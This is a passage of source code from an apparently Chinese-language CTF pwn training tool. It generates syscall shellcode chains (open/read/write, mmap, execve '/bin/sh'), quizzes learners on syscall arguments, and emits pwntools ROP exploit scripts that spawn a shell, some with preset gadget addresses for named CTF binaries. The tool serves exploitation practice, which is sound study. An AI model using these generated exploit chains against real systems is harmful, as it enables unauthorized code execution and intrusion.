  if(ok.needs.indexOf(mmName)>=0){
    var mm=requireSys(mmName), wr=requireSys("write");
    chain=[openerStep(),
      {name:mmName,nr:mm.nr,code:buildCode(mm,["0","0x100","1","2","'rax'","0"]),rax:raxAfter(mmName),vals:["0","0x100","1","2","'rax'","0"],strVal:""},
      {name:"write",nr:wr.nr,code:buildCode(wr,["1","'rax'","0x100"]),rax:raxAfter("write"),vals:["1","'rax'","0x100"],strVal:""}];
  } else if(ok.needs.indexOf("read")>=0){
    var rd=requireSys("read"), wr2=requireSys("write");
    chain=[openerStep(),
      {name:"read",nr:rd.nr,code:buildCode(rd,["'rax'","'rsp'","0x100"]),rax:raxAfter("read"),vals:["'rax'","'rsp'","0x100"],strVal:""},
      {name:"write",nr:wr2.nr,code:buildCode(wr2,["1","'rsp'","0x100"]),rax:raxAfter("write"),vals:["1","'rsp'","0x100"],strVal:""}];
  } else if(ok.needs.indexOf("sendfile")>=0){
    var sf=requireSys("sendfile");
    chain=[openerStep(),
      {name:"sendfile",nr:sf.nr,code:buildCode(sf,["1","'rax'","0","0x100"]),rax:raxAfter("sendfile"),vals:["1","'rax'","0","0x100"],strVal:""}];
  } else {
    var ev=requireSys("execve");
    chain=[{name:"execve",nr:ev.nr,code:"sc += shellcraft.pushstr('/bin/sh')\n"+buildCode(ev,["'rsp'","0","0"]),rax:raxAfter("execve"),vals:["'rsp'","0","0"],strVal:"/bin/sh"}];
  }
  renderChain();
  show("<b>已按白名单生成："+label+"</b>，只用了名单内的调用。整段代码在下面 ④ 拼链区，点「复制整段 shellcode」就能复制走（文件名默认 flag，在链里第一步改），回 VM 对真题跑通才算数。");
  toast("已生成工具链："+label);
  $("chainBox").scrollIntoView({behavior:"smooth",block:"nearest"});
}
$("wlGenBtn").addEventListener("click",wlGenChain);

// 常量点击填入
document.querySelectorAll<HTMLElement>("[data-fill]").forEach(function(td){
  td.addEventListener("click",function(){
    if(lastFocus){lastFocus.value=dispVal((td.dataset.fill ?? "").replace(/^'|'$/g,""));render();toast("已填入 "+td.dataset.fill);}
    else toast("先点一下上面某个参数输入框，再点常量");
  });
});

["wlWriteFd","wlOpenName","wlReadFd","wlExecBan"].forEach(function(id){ var el=$(id); if(el) el.addEventListener("input",parseParamRules); });
// 白名单输入与快捷
$("wlInput").addEventListener("input",parseWL);
// 快捷按钮按调用名存，不写死调用号：parseWL 按当前架构的表查号，切架构时 setArch 会重新 parseWL，
// 名字会按新架构重新查号，不会再把 amd64 的 1,2,9 带到 i386 变成 exit/fork/link。
// i386 没有六参数 mmap，mmap 那组用 mmap2；openat 那组的 newfstatat 在 i386 叫 fstatat64。
function wlPresetNames(key: string){
  if(key==="mmap") return arch==="i386" ? ["open","mmap2","write"] : ["open","mmap","write"];
  if(key==="orw") return ["open","read","write"];
  if(key==="openat") return arch==="i386" ? ["read","write","openat","fstatat64"] : ["read","write","openat","newfstatat"];
  return [];
}
function refreshWlButtons(){
  document.querySelectorAll<HTMLButtonElement>("[data-wl-preset]").forEach(function(b){
    var k=b.dataset.wlPreset; if(!k) return;
    var names=wlPresetNames(k);
    var nums=names.map(function(n){var s=SYS.find(function(x){return x.name===n;});return s? s.nr : "?";});
    b.textContent=(k==="openat" ? "openat 版 ORW" : names.join(" / "))+" {"+nums.join(",")+"}";
  });
}
document.querySelectorAll<HTMLButtonElement>("[data-wl-preset]").forEach(function(b){
  b.addEventListener("click",function(){
    var k=b.dataset.wlPreset;
    if(!k){ $("wlInput").value=""; parseWL(); toast("白名单已清空"); return; }
    $("wlInput").value=wlPresetNames(k).join(",");
    parseWL();
    toast("白名单已设置（"+arch+"）");
  });
});
refreshWlButtons();

// ===== 填空练习（amd64） =====
var QUIZ=[
 {sys:"write", goal:"场景：flag 已被 mmap 映射到内存，地址还在 <b>rax</b> 里。要把其中 <b>256 字节</b>输出到<b>终端</b>。填 write 的三个参数：",
  answers:["1","'rax'","0x100"],
  hints:["fd：输出到终端是固定约定，stdout = 1","buf：数据在 mmap 返回的地址里，上一步返回值还在 rax","count：256 字节写十六进制是 0x100"]},
 {sys:"read", goal:"场景：open 刚打开 flag，fd 还在 <b>rax</b> 里。要把文件内容读 <b>0x100 字节</b>到<b>栈顶</b>。填 read 的三个参数：",
  answers:["'rax'","'rsp'","0x100"],
  hints:["fd：不是 0/1/2，是 open 返回的 fd，还在 rax 里","buf：读到栈顶就是 rsp","count：题目给的就是 0x100"]},
 {sys:"mmap", goal:"场景：把 open 返回的 fd（还在 <b>rax</b>）映射 <b>一页</b>进来，<b>只读</b>、<b>私有</b>映射，从文件<b>开头</b>开始，地址让内核选。填 mmap 的六个参数：",
  answers:["0","0x1000","1","2","'rax'","0"],
  hints:["addr：让内核选地址填 0","len：一页 = 0x1000","prot：只读 PROT_READ = 1","flags：私有 MAP_PRIVATE = 2","fd：open 的返回值在 rax","off：从开头填 0"]},
 {sys:"chmod", goal:"场景：flag 文件属主不是你，读不了。要先把它的权限改成<b>所有人可读可写可执行</b>（文件名已 pushstr 压栈）。填 chmod 的两个参数：",
  answers:["'rsp'","0o777"],
  hints:["filename：字符串指针，pushstr 后传 rsp，不是长度","mode：rwxrwxrwx 用八进制 0o777（每位 读4+写2+执行1），别写成十进制 777"]}
];
function parseNum(v: string){
  v=(v||"").trim().toLowerCase().replace(/^'|'$/g,"");
  if(/^0x[0-9a-f]+$/.test(v)) return parseInt(v,16);
  if(/^0o[0-7]+$/.test(v)) return parseInt(v.slice(2),8);
  if(/^-?\d+$/.test(v)) return parseInt(v,10);
  return null;
}
function valEq(user: string, ans: string){
  var un=parseNum(user), an=parseNum(ans);
  if(un!==null && an!==null) return un===an;
  return (user||"").trim().toLowerCase().replace(/^'|'$/g,"") === (ans||"").trim().toLowerCase().replace(/^'|'$/g,"");
}
(function buildQuiz(){
  var box=$("quizBox");
  box.innerHTML=QUIZ.map(function(q,qi){
    var s=SYS64.find(function(x){return x.name===q.sys;});
    if (!s) throw new Error("Missing quiz syscall: " + q.sys);
    var fields=s.args.map(function(a,i){
      return '<div class="q-field"><label>ARG'+i+" "+REGS64[i]+" · "+argName(a)+'</label><input type="text" data-q="'+qi+'" data-f="'+i+'" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="?"></div>';
    }).join("");
    return '<div class="quiz-item"><p class="q-goal">'+q.goal+'</p><div class="q-fields">'+fields+'</div><div class="btn-row"><button class="btn btn-primary" data-check="'+qi+'">检查</button><button class="btn btn-ghost" data-show="'+qi+'">看答案</button></div><p class="q-result" id="qr'+qi+'"></p></div>';
  }).join("");
  box.querySelectorAll<HTMLButtonElement>("[data-check]").forEach(function(b){
    b.addEventListener("click",function(){
      var qi=Number(b.dataset.check), q=QUIZ[qi], wrong: number[]=[];
      box.querySelectorAll<HTMLInputElement>('input[data-q="'+qi+'"]').forEach(function(inp){
        var i=Number(inp.dataset.f), ok=valEq(inp.value, q.answers[i]);
        inp.classList.toggle("ok",ok); inp.classList.toggle("bad",!ok);
        if(!ok) wrong.push(i);
      });
      var r=$("qr"+qi); r.classList.add("show");
      if(!wrong.length) r.innerHTML='<span class="ok">全对 ✓</span> 生成出来就是：<span class="mono">syscall(\'SYS_'+q.sys+"', "+q.answers.join(", ")+")</span>";
      else r.innerHTML=wrong.map(function(i){return '<span class="bad">ARG'+i+" 不对。</span>"+q.hints[i];}).join("<br>");
    });
  });
  box.querySelectorAll<HTMLButtonElement>("[data-show]").forEach(function(b){
    b.addEventListener("click",function(){
      var qi=Number(b.dataset.show), q=QUIZ[qi];
      box.querySelectorAll<HTMLInputElement>('input[data-q="'+qi+'"]').forEach(function(inp){ inp.value=q.answers[Number(inp.dataset.f)].replace(/^'|'$/g,""); inp.classList.remove("ok","bad"); });
      var r=$("qr"+qi); r.classList.add("show"); r.innerHTML="答案已填上，对照着看每个值是从哪来的（固定约定 / 上一步 rax / 自己定 / 八进制权限）。";
    });
  });
})();

// ===== ROP 链模式（4.1 / 4.2 / 4.3）=====
var ropTpl: RopTemplate ="41";
var ropPrim: InputPrimitive ="unknown"; // gets | read-fixed | read-stream | unknown
function ropZerosU32(n: number){ n=n>>>0; var c=0; for(var i=0;i<4;i++){ if(((n>>(i*8))&0xff)===0) c++; } return c; }
function ropZerosVals(vals: (string | number)[]){ var c=0; for(var i=0;i<vals.length;i++){ var n=parseNum(String(vals[i])); if(n!==null) c+=ropZerosU32(n); } return c; }
function ropPyBytes(chunk: number[]){ // byte-number array -> python bytes literal, e.g. b'/bin' / b'/sh\x00'
  var s="";
  for(var i=0;i<chunk.length;i++){ var b=chunk[i];
    if(b===0x5c) s+="\\\\";
    else if(b===0x27) s+="\\'";
    else if(b>=0x20 && b<=0x7e) s+=String.fromCharCode(b);
    else s+="\\x"+("0"+b.toString(16)).slice(-2);
  }
  return "b'"+s+"'";
}
function ropEscapeHtml(value: string){
  return String(value).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");
}
function ropChunkBytes(str: string, size: number){ // string -> NUL-terminated, zero-padded chunks of size bytes
  var raw=[];
  raw=Array.from(new TextEncoder().encode(str));
  raw.push(0);
  while(raw.length%size) raw.push(0);
  var out=[];
  for(var j=0;j<raw.length;j+=size) out.push(raw.slice(j,j+size));
  return out;
}
function ropDelayVal(){ var d=parseFloat(ropV("ropDelay")); return (isFinite(d) && d>=0) ? String(d) : "0.3"; }
function ropWarnFor(zeros: number | string, total: number | string, prim: InputPrimitive){
  var size="这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00。";
  if(prim==="gets") return size+"gets 按换行或 EOF 结束，可读入 NUL；发送时补换行，并检查 payload 内的 0x0a。后续若再用字符串函数处理，仍可能受 NUL 影响。";
  if(prim==="strcpy") return size+"strcpy 在源字符串首个 NUL 处终止；含 NUL 的完整二进制链不能直接依赖这条复制路径传入。";
  if(prim==="read-fixed") return size+"单次 read 可读 NUL，但不保证读满 count；核对实际返回长度。延时不能保证分阶段边界。";
  if(prim==="read-stream") return size+"循环读取的结束条件由目标代码决定；若必须读满固定长度，先按协议补足首段，不能只靠 sleep。";
  return size+"尚未确认输入方式：检查终止条件、实际读入长度与后续字符串复制；两阶段发送应按协议同步。";
}
function ropSetPrim(p: InputPrimitive){
  ropPrim=p;
  [["Gets","gets"],["Strcpy","strcpy"],["ReadFix","read-fixed"],["ReadStream","read-stream"],["Unknown","unknown"]].forEach(function(kv){
    var b=$("ropPrim"+kv[0]); if(b) b.classList.toggle("on", p===kv[1]);
  });
  ropGen();
}
function ropV(id: string){ var el=input(id); return el ? el.value.trim() : ""; }
function ropSet(id: string, v: string){ var el=input(id); if(el) el.value=v; }
var ROP_COND: Record<RopTemplate, string> ={
 "41":"条件：i386 静态；有 pop eax、pop edx/ecx/ebx、int 0x80。代表：cmcc_simplerop。思路：链里先 read(0, bss, len) 把 /bin/sh 读进 BSS，再 execve(bss, 0, 0)。示例 gadget 地址（cmcc_simplerop）未验证，按当前目标重测后填。",
 "42":"条件：i386 静态；有 pop eax、pop edx/ecx/ebx、mov [edx],eax、int 0x80；bss_addr 可写。代表：get_started_3dsctf_2016。思路：用 mov 写 gadget 把字符串按 4 字节分块写进 BSS，再 execve。示例 gadget 地址由用户提供、未验证。",
 "43":"条件：amd64；有 pop rax/rdi/rsi/rdx + syscall；目标里已有 /bin/sh 字符串。代表：静态 amd64 题、smallest 变体。默认全 0 是骨架占位，按当前目标重测后填。",
 "41a":"条件：amd64；有 pop rax/rdi/rsi/rdx + syscall；可写 BSS。思路：4.1 的 amd64 版——先 read(0, bss, len) 把 /bin/sh 读进 BSS，再 execve(bss, 0, 0)。默认全 0 是骨架占位，按当前目标重测后填。",
 "42a":"条件：amd64；有 pop rax、pop rdi、mov [rdi],rax、pop rsi/rdx + syscall；bss_addr 可写。思路：4.2 的 amd64 版——用 mov 写 gadget 把字符串按 8 字节分块写进 BSS，再 execve。默认全 0 是骨架占位，按当前目标重测后填；若目标没有 mov [rdi],rax，改走 4.1a 的 read 写法。"
};
var ROP_FIELDS: Record<RopTemplate, [string, string][]> ={
 "41":[["ropOffset","offset_to_ret"],["rop41PopEax","pop_eax_addr"],["rop41Pop3","pop3_addr"],["rop41Int80","int80_addr"],["rop41Bss","bss_addr"],["rop41Len","read 长度"]],
 "42":[["ropOffset","offset_to_ret"],["rop42Binsh","binsh_addr"],["rop42PopEax","pop_eax_addr"],["rop42Pop3","pop3_addr"],["rop42Mov","mov_edx_eax"],["rop42Int80","int80_addr"]],
 "43":[["ropOffset","offset_to_ret"],["rop43PopRax","pop_rax_addr"],["rop43PopRdi","pop_rdi_addr"],["rop43PopRsi","pop_rsi_addr"],["rop43PopRdx","pop_rdx_addr"],["rop43Syscall","syscall_addr"],["rop43Binsh","binsh_addr"]],
 "41a":[["ropOffset","offset_to_ret"],["rop41aPopRax","pop_rax_addr"],["rop41aPopRdi","pop_rdi_addr"],["rop41aPopRsi","pop_rsi_addr"],["rop41aPopRdx","pop_rdx_addr"],["rop41aSyscall","syscall_addr"],["rop41aBss","bss_addr"],["rop41aLen","read 长度"]],
 "42a":[["ropOffset","offset_to_ret"],["rop42aBinsh","binsh_addr"],["rop42aPopRax","pop_rax_addr"],["rop42aPopRdi","pop_rdi_addr"],["rop42aMov","mov_rdi_rax"],["rop42aPopRsi","pop_rsi_addr"],["rop42aPopRdx","pop_rdx_addr"],["rop42aSyscall","syscall_addr"]]
};
function ropGen(){
  var off=ropV("ropOffset")||"0x20", lines: string[]=[], steps: [string, string][]=[], L: {zeros: number | null; total: number | null} | undefined;
  var delay=ropDelayVal();
  if(ropTpl==="41"){
    var pe=ropV("rop41PopEax"), p3=ropV("rop41Pop3"), i8=ropV("rop41Int80"), bss=ropV("rop41Bss"), len=ropV("rop41Len")||"0x100";
    var vals41=[pe,3,p3,len,bss,0,i8, pe,11,p3,0,0,bss,i8];
    var z41=ropZerosVals(vals41);
    var offN=parseNum(off), total41=(offN!==null ? offN : 0)+vals41.length*4;
    lines=[
      "# 4.1 i386 int 0x80：read → BSS → execve（cmcc_simplerop 型）",
      "# 示例 gadget 地址（cmcc_simplerop）未验证，按当前目标重测后填",
      "from pwn import *",
      "import time",
      "context.arch = 'i386'",
      "io = process('./prog')  # TODO: 改成你的目标",
      "",
      "offset_to_ret = "+off+"          # 输入起点 → saved EIP 的填充数",
      "pop_eax_addr = "+pe+"      # pop eax; ret，把系统调用号放进 eax",
      "pop3_addr = "+p3+"         # pop edx; pop ecx; pop ebx; ret，一次设 3 个参数",
      "int80_addr = "+i8+"        # int 0x80; ret，进内核",
      "bss_addr = "+bss+"          # 可写 BSS，第二次 read 和 /bin/sh 放这里",
      "",
      "# 第一段 read(0, bss, "+len+")：eax=3，edx="+len+"，ecx=bss，ebx=0",
      "# 第二段 execve(bss, 0, 0)：eax=11，edx=0，ecx=0，ebx=bss",
      "# 注意 pop3 弹出顺序是 edx, ecx, ebx，所以 flat 里 pop3 后面按 edx, ecx, ebx 的值排",
      "# \\x00 警告：这条链共 "+total41+" 字节，含 "+z41+" 个 \\x00（调用号 3/11、长度、0 参数都会带 \\x00）；strcpy 遇 NUL 终止；gets 遇换行结束，read 可读 NUL",
      "# 没有 pop3？见本节“没有 pop3 只有单个 pop 的回退”段：逐个 pop 设寄存器，别硬套 pop3 模板",
      "chain = flat(b'A'*offset_to_ret, pop_eax_addr, 3, pop3_addr, "+len+", bss_addr, 0, int80_addr,",
      "             pop_eax_addr, 11, pop3_addr, 0, 0, bss_addr, int80_addr)",
      "io.send(chain)                 # 先发链",
      "time.sleep("+delay+")            # 两次发送间隔 "+delay+"s：仅作可选延时；请按目标的读入长度/提示同步，sleep 不能保证边界",
      "io.send(b'/bin/sh\\x00')          # 链里的 read 会把这一行读进 bss",
      "io.interactive()"
    ];
    steps=[
      ["步骤 1 · read(0, bss, "+len+")","eax=3 · ebx=0 (fd=stdin) · ecx="+bss+" (buf=bss) · edx="+len+" (count)　|　pop3 段按 edx,ecx,ebx 填："+len+", "+bss+", 0"],
      ["步骤 2 · execve(bss, 0, 0)","eax=11 · ebx="+bss+" (path) · ecx=0 (argv) · edx=0 (envp)　|　pop3 段按 edx,ecx,ebx 填：0, 0, "+bss],
      ["发送顺序","先按输入方式发送 chain，最多延时 "+delay+"s，再 io.send(b'/bin/sh\\0')——链跑到 read 时才从输入里取字符串，顺序反了读不到；gets 要有换行；循环定长读要先补足长度；按实际协议同步"],
      ["\\x00 统计","链共 "+total41+" 字节，含 "+z41+" 个 \\x00（主要来自调用号 3、11 和 0 参数）"]
    ];
    L={zeros:z41,total:total41};
  }else if(ropTpl==="42"){
    var bs=ropV("rop42Binsh"), pe2=ropV("rop42PopEax"), p32=ropV("rop42Pop3"), mv=ropV("rop42Mov"), i82=ropV("rop42Int80");
    var str42=ropV("rop42Str")||"/bin/sh";
    var chunks42=ropChunkBytes(str42, 4);
    var bn=parseNum(bs);
    var vals42: (number | string)[]=[];
    chunks42.forEach(function(c,k){ var cv=(c[0]|(c[1]<<8)|(c[2]<<16)|(c[3]<<24))>>>0; vals42.push(pe2, cv, p32, bs, 0, 0, mv); });
    vals42.push(pe2, 11, p32, 0, 0, bs, i82);
    var z42=0; vals42.forEach(function(v){ z42+=ropZerosU32(typeof v==="number" ? v : (parseNum(String(v)) ?? 0)); });
    var offN42=parseNum(off), total42=(offN42!==null ? offN42 : 0)+vals42.length*4;
    lines=[
      "# 4.2 i386：写字符串到 BSS 再 execve（get_started_3dsctf_2016 型）",
      "# 示例 gadget 地址由用户提供、未验证",
      "from pwn import *",
      "context.arch = 'i386'",
      "io = process('./prog')  # TODO: 改成你的目标",
      "",
      "offset_to_ret = "+off+"            # 输入起点 → saved EIP 的填充数",
      "binsh_addr = "+bs+"       # 写入字符串的可写 BSS 地址",
      "pop_eax_addr = "+pe2+"     # pop eax; ret",
      "pop3_addr = "+p32+"        # pop edx; pop ecx; pop ebx; ret",
      "mov_edx_eax = "+mv+"      # mov dword ptr [edx], eax; ret",
      "int80_addr = "+i82+"       # int 0x80; ret",
      "",
      "p = b'A'*offset_to_ret",
      "# 写 \""+str42+"\"（"+(new TextEncoder().encode(str42).length+1)+" 字节含结尾 \\x00，自动按 4 字节分块，共 "+chunks42.length+" 块）",
      "# \\x00 警告：这条链共 "+total42+" 字节，含 "+z42+" 个 \\x00；strcpy 遇 NUL 终止；gets 遇换行结束，read 可读 NUL",
      "# 没有 pop3？见本节“没有 pop3 只有单个 pop 的回退”段：逐个 pop 设寄存器，别硬套 pop3 模板"
    ];
    chunks42.forEach(function(c,k){
      var addr=(bn!==null ? "0x"+(bn+4*k).toString(16) : "binsh_addr+"+(4*k));
      var addrVar=(k===0 ? "binsh_addr" : "binsh_addr+"+(4*k));
      lines.push("# 写块 "+(k+1)+"/"+chunks42.length+"："+ropPyBytes(c)+" → "+addr+"（第 "+(k+1)+" 块地址 = binsh+"+(4*k)+"）");
      lines.push("p += flat(pop_eax_addr, u32("+ropPyBytes(c)+")) + flat(pop3_addr, "+addrVar+", 0, 0, mov_edx_eax)");
    });
    lines.push("# execve(binsh_addr, 0, 0)：eax=11，ebx=binsh_addr，ecx=edx=0（pop3 段按 edx,ecx,ebx 填：0, 0, binsh_addr）");
    lines.push("p += flat(pop_eax_addr, 11) + flat(pop3_addr, 0, 0, binsh_addr, int80_addr)");
    lines.push("io.sendline(p); io.interactive()");
    steps=chunks42.map(function(c,k){
      var addr=(bn!==null ? "0x"+(bn+4*k).toString(16) : "binsh_addr+"+(4*k));
      return ["写块 "+(k+1)+"/"+chunks42.length+" · "+ropPyBytes(c)+" → "+addr,"eax=u32("+ropPyBytes(c)+") · edx="+addr+" · 执行 mov [edx], eax　|　pop3 段："+addr+", 0, 0，后接 mov_edx_eax"];
    });
    steps.push(["最后 · execve(binsh, 0, 0)","eax=11 · ebx="+bs+" · ecx=0 · edx=0　|　pop3 段按 edx,ecx,ebx 填：0, 0, "+bs+"，后接 int80_addr"]);
    steps.push(["\\x00 统计","链共 "+total42+" 字节，含 "+z42+" 个 \\x00"]);
    L={zeros:z42,total:total42};
  }else if(ropTpl==="41a"){
    var pra=ropV("rop41aPopRax"), prdi=ropV("rop41aPopRdi"), prsi=ropV("rop41aPopRsi"), prdx=ropV("rop41aPopRdx"), sca=ropV("rop41aSyscall"), bsa=ropV("rop41aBss"), lena=ropV("rop41aLen")||"0x100";
    lines=[
      "# 4.1a amd64 syscall：read → BSS → execve（4.1 的 amd64 版）",
      "# SKELETON：0 是占位地址，没有实测参数；按当前目标重测后填",
      "from pwn import *",
      "import time",
      "context.arch = 'amd64'",
      "io = process('./prog')  # TODO: 改成你的目标",
      "",
      "offset_to_ret = "+off+"          # 输入起点 → saved RIP 的填充数",
      "pop_rax_addr = "+pra+"              # pop rax; ret",
      "pop_rdi_addr = "+prdi+"              # pop rdi; ret",
      "pop_rsi_addr = "+prsi+"              # pop rsi; ret",
      "pop_rdx_addr = "+prdx+"              # pop rdx; ret",
      "syscall_addr = "+sca+"              # syscall; ret",
      "bss_addr = "+bsa+"          # 可写 BSS，第二次 read 和 /bin/sh 放这里",
      "",
      "# 第一段 read(0, bss, "+lena+")：rax=0，rdi=0，rsi=bss，rdx="+lena,
      "# 第二段 execve(bss, 0, 0)：rax=59，rdi=bss，rsi=0，rdx=0",
      "# \\x00 警告：占位 0 还没填，\\x00 数等填入真实地址后再算；strcpy 遇 NUL 终止；gets 遇换行结束，read 可读 NUL",
      "chain = flat(b'A'*offset_to_ret, pop_rax_addr, 0, pop_rdi_addr, 0, pop_rsi_addr, bss_addr, pop_rdx_addr, "+lena+", syscall_addr,",
      "             pop_rax_addr, 59, pop_rdi_addr, bss_addr, pop_rsi_addr, 0, pop_rdx_addr, 0, syscall_addr)",
      "io.send(chain)                 # 先发链",
      "time.sleep("+delay+")            # 两次发送间隔 "+delay+"s：仅作可选延时；请按目标的读入长度/提示同步，sleep 不能保证边界",
      "io.send(b'/bin/sh\\x00')          # 链里的 read 会把这一行读进 bss",
      "io.interactive()"
    ];
    steps=[
      ["步骤 1 · read(0, bss, "+lena+")","rax=0 · rdi=0 (fd=stdin) · rsi="+bsa+" (buf=bss) · rdx="+lena+" (count)"],
      ["步骤 2 · execve(bss, 0, 0)","rax=59 (amd64 execve 号) · rdi="+bsa+" (path) · rsi=0 (argv) · rdx=0 (envp)"],
      ["发送顺序","先按输入方式发送 chain，最多延时 "+delay+"s，再 io.send(b'/bin/sh\\0')——gets 要有换行；循环定长读要先补足长度；按实际协议同步"]
    ];
    L={zeros:null,total:null};
  }else if(ropTpl==="42a"){
    var bsa2=ropV("rop42aBinsh"), pra2=ropV("rop42aPopRax"), prdi2=ropV("rop42aPopRdi"), mv2=ropV("rop42aMov"), prsi2=ropV("rop42aPopRsi"), prdx2=ropV("rop42aPopRdx"), sc2=ropV("rop42aSyscall");
    var str42a=ropV("rop42Str")||"/bin/sh";
    var chunks42a=ropChunkBytes(str42a, 8);
    var bn2=parseNum(bsa2);
    lines=[
      "# 4.2a amd64：写字符串到 BSS 再 execve（4.2 的 amd64 版）",
      "# SKELETON：0 是占位地址，没有实测参数；按当前目标重测后填",
      "from pwn import *",
      "context.arch = 'amd64'",
      "io = process('./prog')  # TODO: 改成你的目标",
      "",
      "offset_to_ret = "+off+"            # 输入起点 → saved RIP 的填充数",
      "binsh_addr = "+bsa2+"       # 写入字符串的可写 BSS 地址",
      "pop_rax_addr = "+pra2+"     # pop rax; ret",
      "pop_rdi_addr = "+prdi2+"     # pop rdi; ret",
      "mov_rdi_rax = "+mv2+"      # mov qword ptr [rdi], rax; ret（若目标没有，改走 4.1a 的 read 写法）",
      "pop_rsi_addr = "+prsi2+"     # pop rsi; ret",
      "pop_rdx_addr = "+prdx2+"     # pop rdx; ret",
      "syscall_addr = "+sc2+"      # syscall; ret",
      "",
      "p = b'A'*offset_to_ret",
      "# 写 \""+str42a+"\"（"+(new TextEncoder().encode(str42a).length+1)+" 字节含结尾 \\x00，自动按 8 字节分块，共 "+chunks42a.length+" 块）",
      "# \\x00 警告：占位 0 还没填，\\x00 数等填入真实地址后再算；strcpy 遇 NUL 终止；gets 遇换行结束，read 可读 NUL"
    ];
    chunks42a.forEach(function(c,k){
      var addr=(bn2!==null ? "0x"+(bn2+8*k).toString(16) : "binsh_addr+"+(8*k));
      var addrVar=(k===0 ? "binsh_addr" : "binsh_addr+"+(8*k));
      lines.push("# 写块 "+(k+1)+"/"+chunks42a.length+"："+ropPyBytes(c)+" → "+addr+"（第 "+(k+1)+" 块地址 = binsh+"+(8*k)+"）");
      lines.push("p += flat(pop_rax_addr, u64("+ropPyBytes(c)+")) + flat(pop_rdi_addr, "+addrVar+", mov_rdi_rax)");
    });
    lines.push("# execve(binsh_addr, 0, 0)：rax=59，rdi=binsh_addr，rsi=rdx=0");
    lines.push("p += flat(pop_rax_addr, 59) + flat(pop_rdi_addr, binsh_addr, pop_rsi_addr, 0, pop_rdx_addr, 0, syscall_addr)");
    lines.push("io.sendline(p); io.interactive()");
    steps=chunks42a.map(function(c,k){
      var addr=(bn2!==null ? "0x"+(bn2+8*k).toString(16) : "binsh_addr+"+(8*k));
      return ["写块 "+(k+1)+"/"+chunks42a.length+" · "+ropPyBytes(c)+" → "+addr,"rax=u64("+ropPyBytes(c)+") · rdi="+addr+" · 执行 mov [rdi], rax"];
    });
    steps.push(["最后 · execve(binsh, 0, 0)","rax=59 · rdi="+bsa2+" · rsi=0 · rdx=0"]);
    L={zeros:null,total:null};

  }else{
    var pra=ropV("rop43PopRax"), prdi=ropV("rop43PopRdi"), prsi=ropV("rop43PopRsi"), prdx=ropV("rop43PopRdx"), sc=ropV("rop43Syscall"), bsh=ropV("rop43Binsh");
    lines=[
      "# 4.3 amd64 syscall execve（静态 amd64 / smallest 变体型）",
      "# SKELETON：0 是占位地址，没有实测参数；按当前目标重测后填",
      "from pwn import *",
      "context.arch = 'amd64'",
      "io = process('./prog')  # TODO: 改成你的目标",
      "",
      "offset_to_ret = "+off+"          # 输入起点 → saved RIP 的填充数",
      "pop_rax_addr = "+pra+"              # pop rax; ret",
      "pop_rdi_addr = "+prdi+"              # pop rdi; ret",
      "pop_rsi_addr = "+prsi+"              # pop rsi; ret",
      "pop_rdx_addr = "+prdx+"              # pop rdx; ret",
      "syscall_addr = "+sc+"              # syscall 地址",
      "binsh_addr = "+bsh+"                # /bin/sh 地址",
      "# execve(\"/bin/sh\", 0, 0)：rax=59，rdi=binsh，rsi=0，rdx=0",
      "chain = flat(b'A'*offset_to_ret, pop_rax_addr, 59, pop_rdi_addr, binsh_addr, pop_rsi_addr, 0, pop_rdx_addr, 0, syscall_addr)",
      "io.send(chain); io.interactive()"
    ];
    steps=[
      ["execve(\"/bin/sh\", 0, 0)","rax=59 (amd64 execve 号) · rdi="+bsh+" (path) · rsi=0 (argv) · rdx=0 (envp)　|　每个 pop gadget 后面紧跟要放进那个寄存器的值"]
    ];
  }
  lines=lines.reduce<string[]>(function(out,line){
    var sent=/^io\.send(?:line)?\((chain|p)\)/.exec(line);
    if(sent){
      if(ropPrim==="gets") out.push("assert b'\\n' not in "+sent[1]+", 'payload contains newline; gets would stop early'");
      line=line.replace(/^io\.send(?:line)?\(/,ropPrim==="gets" ? "io.sendline(" : "io.send(");
    }
    out.push(line); return out;
  },[]);
  $("ropCode").textContent=lines.join("\n");
  $("ropCond").textContent=ROP_COND[ropTpl];
  $("ropSteps").innerHTML=steps.map(function(s){ return '<div class="rop-step"><b>'+ropEscapeHtml(s[0])+'</b><div class="rs-regs">'+ropEscapeHtml(s[1])+"</div></div>"; }).join("");
  var empty: string[]=[], zeros: string[]=[];
  ROP_FIELDS[ropTpl].forEach(function(f){
    var v=ropV(f[0]);
    if(!v) empty.push(f[1]);
    else if(parseNum(v)===0) zeros.push(f[1]);
  });
  var w=$("ropWarn"), msgs: string[]=[];
  if(empty.length) msgs.push("还没填："+empty.join("、")+"——生成的链里对应位置是空的，先用 ROPgadget 量出来再填。");
  if(zeros.length) msgs.push("还是 0 占位："+zeros.join("、")+"——0 地址一跳就崩，按当前目标重测后填真实地址。");
  if(msgs.length){ w.innerHTML=msgs.join("<br>"); w.classList.add("show"); } else { w.innerHTML=""; w.classList.remove("show"); }
  var pn=$("ropPrimNote");
  if(pn) pn.textContent=ropWarnFor(L && L.zeros!==null ? L.zeros : "待计算", L && L.total!==null ? L.total : "待计算", ropPrim);

}
function ropSetTpl(t: RopTemplate){
  ropTpl=t;
  ["41","42","43","41a","42a"].forEach(function(k){
    var b=$( "ropT"+k), g=$("ropG"+k);
    if(b) b.classList.toggle("on", t===k);
    if(g) g.style.display = t===k ? "" : "none";
  });
  ropGen();
}
$("ropT41").addEventListener("click",function(){ropSetTpl("41");});
$("ropT42").addEventListener("click",function(){ropSetTpl("42");});
$("ropT43").addEventListener("click",function(){ropSetTpl("43");});
$("ropT41a").addEventListener("click",function(){ropSetTpl("41a");});
$("ropT42a").addEventListener("click",function(){ropSetTpl("42a");});
$("ropPrimGets").addEventListener("click",function(){ropSetPrim("gets");});
$("ropPrimStrcpy").addEventListener("click",function(){ropSetPrim("strcpy");});
$("ropPrimReadFix").addEventListener("click",function(){ropSetPrim("read-fixed");});
$("ropPrimReadStream").addEventListener("click",function(){ropSetPrim("read-stream");});
$("ropPrimUnknown").addEventListener("click",function(){ropSetPrim("unknown");});
document.querySelectorAll<HTMLInputElement>(".rop-input").forEach(function(inp){ inp.addEventListener("input", ropGen); });
$("ropPreset41").addEventListener("click",function(){
  ropSet("ropOffset","0x20"); ropSet("rop41PopEax","0x80bae06"); ropSet("rop41Pop3","0x806e850"); ropSet("rop41Int80","0x806eef0"); ropSet("rop41Bss","0x80eaf80"); ropSet("rop41Len","0x100");
